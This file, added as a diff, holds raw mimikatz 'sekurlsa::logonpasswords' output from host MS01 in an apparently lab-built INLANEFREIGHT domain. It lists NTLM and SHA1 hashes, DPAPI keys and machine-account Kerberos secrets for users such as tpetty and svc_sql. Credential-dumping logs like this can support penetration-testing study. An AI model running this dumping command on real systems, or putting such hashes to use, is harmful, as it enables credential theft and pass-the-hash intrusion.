@@ -1,0 +1,338 @@
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 231028 (00000000:00038674)
+Session           : Interactive from 1
+User Name         : tpetty
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+Logon Time        : 4/26/2026 6:51:48 PM
+SID               : S-1-5-21-2270287766-1317258649-2146029398-4607
+        msv :
+         [00000003] Primary
+         * Username : tpetty
+         * Domain   : INLANEFREIGHT
+         * NTLM     : fd37b6fec5704cadabb319cebf9e3a3a
+         * SHA1     : 38afea42a5e28220474839558f073979645a1192
+         * DPAPI    : da2ec07551ab1602b7468db08b41e3b2
+        tspkg :
+        wdigest :
+         * Username : tpetty
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : tpetty
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 76952 (00000000:00012c98)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/26/2026 6:51:07 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 4d57d378850625d1231a7a8577dbf650
+         * SHA1     : 393a7c10414ceeadbbf4cbc0c2c313335d7e8ed0
+        tspkg :
+        wdigest :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : 47 bb bc b5 d7 f8 cd ca b4 40 b9 a3 8c 71 0b c6 3e 4c b5 e2 e2 0b 70 05 3c 73 dd ed df bb 68 3b ce 71 97 c3 21 43 52 29 83 3b c5 1b 4f f5 58 9a 7f d2 2f a8 87 d9 03 61 fe 18 8d 28 b0 32 8b 55 4b 8d 42 34 34 cc bb c6 0e a4 ea ff 01 a2 56 05 7e 6a dd dc 4b bb b8 35 b4 67 d5 55 89 2f a7 91 93 03 c2 04 05 ed a6 e8 dd 9b 57 f4 03 56 7f 9b 5b e5 d0 34 00 36 01 68 2e 0d c1 a6 e9 37 86 9d c5 5e 58 e6 f4 34 d3 f7 8f 34 81 23 83 d4 2c e5 00 d9 ce 24 a1 f7 5d b5 ad b0 e3 35 1e ee ad 98 30 7f 49 c0 42 e9 e7 63 ed 29 6e b7 83 2b e0 21 5b 2b 67 ff 40 dd e4 d8 75 03 2c fc a0 1a e1 19 b5 af 1a b8 be 21 51 70 a7 cf f8 51 e8 e0 5a 85 c7 ce 40 57 de cd 20 09 13 f7 89 15 2a 34 13 0f b2 7f 42 89 49 c7 46 b2 e3 a3 d1 7a 74 b8 eb dc
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 41683 (00000000:0000a2d3)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/26/2026 6:51:05 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 4d57d378850625d1231a7a8577dbf650
+         * SHA1     : 393a7c10414ceeadbbf4cbc0c2c313335d7e8ed0
+        tspkg :
+        wdigest :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : 47 bb bc b5 d7 f8 cd ca b4 40 b9 a3 8c 71 0b c6 3e 4c b5 e2 e2 0b 70 05 3c 73 dd ed df bb 68 3b ce 71 97 c3 21 43 52 29 83 3b c5 1b 4f f5 58 9a 7f d2 2f a8 87 d9 03 61 fe 18 8d 28 b0 32 8b 55 4b 8d 42 34 34 cc bb c6 0e a4 ea ff 01 a2 56 05 7e 6a dd dc 4b bb b8 35 b4 67 d5 55 89 2f a7 91 93 03 c2 04 05 ed a6 e8 dd 9b 57 f4 03 56 7f 9b 5b e5 d0 34 00 36 01 68 2e 0d c1 a6 e9 37 86 9d c5 5e 58 e6 f4 34 d3 f7 8f 34 81 23 83 d4 2c e5 00 d9 ce 24 a1 f7 5d b5 ad b0 e3 35 1e ee ad 98 30 7f 49 c0 42 e9 e7 63 ed 29 6e b7 83 2b e0 21 5b 2b 67 ff 40 dd e4 d8 75 03 2c fc a0 1a e1 19 b5 af 1a b8 be 21 51 70 a7 cf f8 51 e8 e0 5a 85 c7 ce 40 57 de cd 20 09 13 f7 89 15 2a 34 13 0f b2 7f 42 89 49 c7 46 b2 e3 a3 d1 7a 74 b8 eb dc
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : MS01$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 4/26/2026 6:51:04 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : ms01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : 47 bb bc b5 d7 f8 cd ca b4 40 b9 a3 8c 71 0b c6 3e 4c b5 e2 e2 0b 70 05 3c 73 dd ed df bb 68 3b ce 71 97 c3 21 43 52 29 83 3b c5 1b 4f f5 58 9a 7f d2 2f a8 87 d9 03 61 fe 18 8d 28 b0 32 8b 55 4b 8d 42 34 34 cc bb c6 0e a4 ea ff 01 a2 56 05 7e 6a dd dc 4b bb b8 35 b4 67 d5 55 89 2f a7 91 93 03 c2 04 05 ed a6 e8 dd 9b 57 f4 03 56 7f 9b 5b e5 d0 34 00 36 01 68 2e 0d c1 a6 e9 37 86 9d c5 5e 58 e6 f4 34 d3 f7 8f 34 81 23 83 d4 2c e5 00 d9 ce 24 a1 f7 5d b5 ad b0 e3 35 1e ee ad 98 30 7f 49 c0 42 e9 e7 63 ed 29 6e b7 83 2b e0 21 5b 2b 67 ff 40 dd e4 d8 75 03 2c fc a0 1a e1 19 b5 af 1a b8 be 21 51 70 a7 cf f8 51 e8 e0 5a 85 c7 ce 40 57 de cd 20 09 13 f7 89 15 2a 34 13 0f b2 7f 42 89 49 c7 46 b2 e3 a3 d1 7a 74 b8 eb dc
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1653161 (00000000:001939a9)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/26/2026 8:39:04 PM
+SID               : S-1-5-96-0-2
+        msv :
+         [00000003] Primary
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 4d57d378850625d1231a7a8577dbf650
+         * SHA1     : 393a7c10414ceeadbbf4cbc0c2c313335d7e8ed0
+        tspkg :
+        wdigest :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : 47 bb bc b5 d7 f8 cd ca b4 40 b9 a3 8c 71 0b c6 3e 4c b5 e2 e2 0b 70 05 3c 73 dd ed df bb 68 3b ce 71 97 c3 21 43 52 29 83 3b c5 1b 4f f5 58 9a 7f d2 2f a8 87 d9 03 61 fe 18 8d 28 b0 32 8b 55 4b 8d 42 34 34 cc bb c6 0e a4 ea ff 01 a2 56 05 7e 6a dd dc 4b bb b8 35 b4 67 d5 55 89 2f a7 91 93 03 c2 04 05 ed a6 e8 dd 9b 57 f4 03 56 7f 9b 5b e5 d0 34 00 36 01 68 2e 0d c1 a6 e9 37 86 9d c5 5e 58 e6 f4 34 d3 f7 8f 34 81 23 83 d4 2c e5 00 d9 ce 24 a1 f7 5d b5 ad b0 e3 35 1e ee ad 98 30 7f 49 c0 42 e9 e7 63 ed 29 6e b7 83 2b e0 21 5b 2b 67 ff 40 dd e4 d8 75 03 2c fc a0 1a e1 19 b5 af 1a b8 be 21 51 70 a7 cf f8 51 e8 e0 5a 85 c7 ce 40 57 de cd 20 09 13 f7 89 15 2a 34 13 0f b2 7f 42 89 49 c7 46 b2 e3 a3 d1 7a 74 b8 eb dc
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : MS01$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 4/26/2026 6:51:05 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 4d57d378850625d1231a7a8577dbf650
+         * SHA1     : 393a7c10414ceeadbbf4cbc0c2c313335d7e8ed0
+        tspkg :
+        wdigest :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : ms01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : 47 bb bc b5 d7 f8 cd ca b4 40 b9 a3 8c 71 0b c6 3e 4c b5 e2 e2 0b 70 05 3c 73 dd ed df bb 68 3b ce 71 97 c3 21 43 52 29 83 3b c5 1b 4f f5 58 9a 7f d2 2f a8 87 d9 03 61 fe 18 8d 28 b0 32 8b 55 4b 8d 42 34 34 cc bb c6 0e a4 ea ff 01 a2 56 05 7e 6a dd dc 4b bb b8 35 b4 67 d5 55 89 2f a7 91 93 03 c2 04 05 ed a6 e8 dd 9b 57 f4 03 56 7f 9b 5b e5 d0 34 00 36 01 68 2e 0d c1 a6 e9 37 86 9d c5 5e 58 e6 f4 34 d3 f7 8f 34 81 23 83 d4 2c e5 00 d9 ce 24 a1 f7 5d b5 ad b0 e3 35 1e ee ad 98 30 7f 49 c0 42 e9 e7 63 ed 29 6e b7 83 2b e0 21 5b 2b 67 ff 40 dd e4 d8 75 03 2c fc a0 1a e1 19 b5 af 1a b8 be 21 51 70 a7 cf f8 51 e8 e0 5a 85 c7 ce 40 57 de cd 20 09 13 f7 89 15 2a 34 13 0f b2 7f 42 89 49 c7 46 b2 e3 a3 d1 7a 74 b8 eb dc
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1683655 (00000000:0019b0c7)
+Session           : RemoteInteractive from 2
+User Name         : svc_sql
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+Logon Time        : 4/26/2026 8:39:05 PM
+SID               : S-1-5-21-2270287766-1317258649-2146029398-4608
+        msv :
+         [00000003] Primary
+         * Username : svc_sql
+         * Domain   : INLANEFREIGHT
+         * NTLM     : dc3ba1d16d82ac977eea8c22c5de3f82
+         * SHA1     : c052c598aaed303e20658a4a6341320867d8dcc4
+         * DPAPI    : 32d87218d6331c60d8448418e504b7df
+        tspkg :
+        wdigest :
+         * Username : svc_sql
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : svc_sql
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1683463 (00000000:0019b007)
+Session           : RemoteInteractive from 2
+User Name         : svc_sql
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+Logon Time        : 4/26/2026 8:39:05 PM
+SID               : S-1-5-21-2270287766-1317258649-2146029398-4608
+        msv :
+         [00000003] Primary
+         * Username : svc_sql
+         * Domain   : INLANEFREIGHT
+         * NTLM     : dc3ba1d16d82ac977eea8c22c5de3f82
+         * SHA1     : c052c598aaed303e20658a4a6341320867d8dcc4
+         * DPAPI    : 32d87218d6331c60d8448418e504b7df
+        tspkg :
+        wdigest :
+         * Username : svc_sql
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : svc_sql
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1654062 (00000000:00193d2e)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/26/2026 8:39:04 PM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 4d57d378850625d1231a7a8577dbf650
+         * SHA1     : 393a7c10414ceeadbbf4cbc0c2c313335d7e8ed0
+        tspkg :
+        wdigest :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : 47 bb bc b5 d7 f8 cd ca b4 40 b9 a3 8c 71 0b c6 3e 4c b5 e2 e2 0b 70 05 3c 73 dd ed df bb 68 3b ce 71 97 c3 21 43 52 29 83 3b c5 1b 4f f5 58 9a 7f d2 2f a8 87 d9 03 61 fe 18 8d 28 b0 32 8b 55 4b 8d 42 34 34 cc bb c6 0e a4 ea ff 01 a2 56 05 7e 6a dd dc 4b bb b8 35 b4 67 d5 55 89 2f a7 91 93 03 c2 04 05 ed a6 e8 dd 9b 57 f4 03 56 7f 9b 5b e5 d0 34 00 36 01 68 2e 0d c1 a6 e9 37 86 9d c5 5e 58 e6 f4 34 d3 f7 8f 34 81 23 83 d4 2c e5 00 d9 ce 24 a1 f7 5d b5 ad b0 e3 35 1e ee ad 98 30 7f 49 c0 42 e9 e7 63 ed 29 6e b7 83 2b e0 21 5b 2b 67 ff 40 dd e4 d8 75 03 2c fc a0 1a e1 19 b5 af 1a b8 be 21 51 70 a7 cf f8 51 e8 e0 5a 85 c7 ce 40 57 de cd 20 09 13 f7 89 15 2a 34 13 0f b2 7f 42 89 49 c7 46 b2 e3 a3 d1 7a 74 b8 eb dc
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 1654038 (00000000:00193d16)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/26/2026 8:39:04 PM
+SID               : S-1-5-90-0-2
+        msv :
+         [00000003] Primary
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 4d57d378850625d1231a7a8577dbf650
+         * SHA1     : 393a7c10414ceeadbbf4cbc0c2c313335d7e8ed0
+        tspkg :
+        wdigest :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : 47 bb bc b5 d7 f8 cd ca b4 40 b9 a3 8c 71 0b c6 3e 4c b5 e2 e2 0b 70 05 3c 73 dd ed df bb 68 3b ce 71 97 c3 21 43 52 29 83 3b c5 1b 4f f5 58 9a 7f d2 2f a8 87 d9 03 61 fe 18 8d 28 b0 32 8b 55 4b 8d 42 34 34 cc bb c6 0e a4 ea ff 01 a2 56 05 7e 6a dd dc 4b bb b8 35 b4 67 d5 55 89 2f a7 91 93 03 c2 04 05 ed a6 e8 dd 9b 57 f4 03 56 7f 9b 5b e5 d0 34 00 36 01 68 2e 0d c1 a6 e9 37 86 9d c5 5e 58 e6 f4 34 d3 f7 8f 34 81 23 83 d4 2c e5 00 d9 ce 24 a1 f7 5d b5 ad b0 e3 35 1e ee ad 98 30 7f 49 c0 42 e9 e7 63 ed 29 6e b7 83 2b e0 21 5b 2b 67 ff 40 dd e4 d8 75 03 2c fc a0 1a e1 19 b5 af 1a b8 be 21 51 70 a7 cf f8 51 e8 e0 5a 85 c7 ce 40 57 de cd 20 09 13 f7 89 15 2a 34 13 0f b2 7f 42 89 49 c7 46 b2 e3 a3 d1 7a 74 b8 eb dc
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 77003 (00000000:00012ccb)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 4/26/2026 6:51:07 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : ecfe27900016073fffef1bb4b2132bb2
+         * SHA1     : 678b71f548a76f72cc3d2058121cf71ae896c310
+        tspkg :
+        wdigest :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : ^kF)nFYj_k Qd64RbS@&)(hnL0@xi=!Q]tQ\jdNFxroquWa@CdTv\Xr^rk;GXzr$mHFL5`P*;5dD]u6Nc_95IT\1jN0MgOJk"@(7jH1u4?3EY_7o8b5-fcL=
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 4/26/2026 6:51:06 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 64815 (00000000:0000fd2f)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 4/26/2026 6:51:06 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 4d57d378850625d1231a7a8577dbf650
+         * SHA1     : 393a7c10414ceeadbbf4cbc0c2c313335d7e8ed0
+        tspkg :
+        wdigest :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : 47 bb bc b5 d7 f8 cd ca b4 40 b9 a3 8c 71 0b c6 3e 4c b5 e2 e2 0b 70 05 3c 73 dd ed df bb 68 3b ce 71 97 c3 21 43 52 29 83 3b c5 1b 4f f5 58 9a 7f d2 2f a8 87 d9 03 61 fe 18 8d 28 b0 32 8b 55 4b 8d 42 34 34 cc bb c6 0e a4 ea ff 01 a2 56 05 7e 6a dd dc 4b bb b8 35 b4 67 d5 55 89 2f a7 91 93 03 c2 04 05 ed a6 e8 dd 9b 57 f4 03 56 7f 9b 5b e5 d0 34 00 36 01 68 2e 0d c1 a6 e9 37 86 9d c5 5e 58 e6 f4 34 d3 f7 8f 34 81 23 83 d4 2c e5 00 d9 ce 24 a1 f7 5d b5 ad b0 e3 35 1e ee ad 98 30 7f 49 c0 42 e9 e7 63 ed 29 6e b7 83 2b e0 21 5b 2b 67 ff 40 dd e4 d8 75 03 2c fc a0 1a e1 19 b5 af 1a b8 be 21 51 70 a7 cf f8 51 e8 e0 5a 85 c7 ce 40 57 de cd 20 09 13 f7 89 15 2a 34 13 0f b2 7f 42 89 49 c7 46 b2 e3 a3 d1 7a 74 b8 eb dc
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 40566 (00000000:00009e76)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 4/26/2026 6:51:04 PM
+SID               :
+        msv :
+         [00000003] Primary
+         * Username : MS01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 4d57d378850625d1231a7a8577dbf650
+         * SHA1     : 393a7c10414ceeadbbf4cbc0c2c313335d7e8ed0
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
